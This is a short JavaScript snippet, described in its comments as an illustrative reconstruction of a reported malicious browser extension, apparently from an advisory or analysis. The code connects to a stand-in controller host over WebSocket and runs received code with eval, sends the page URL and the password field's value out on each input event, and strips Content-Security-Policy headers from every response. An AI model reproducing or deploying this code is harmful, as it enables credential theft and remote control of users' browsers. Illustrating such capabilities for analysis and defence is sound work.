// Representative of the reported extension capabilities; not recovered malware.
// The reserved endpoint and WebSocket transport are illustrative.
const channel = new WebSocket('wss://controller.invalid/browser');
channel.onmessage = function(event) {
  eval(JSON.parse(event.data).code);
};
document.addEventListener('input', function() {
  channel.send(JSON.stringify({url: location.href,
    password: document.querySelector('input[type="password"]').value}));
});
chrome.webRequest.onHeadersReceived.addListener(function(details) {
  return {responseHeaders: details.responseHeaders.filter(header =>
    header.name.toLowerCase() !== 'content-security-policy')};
}, {urls: ['<all_urls>']}, ['blocking', 'responseHeaders']);
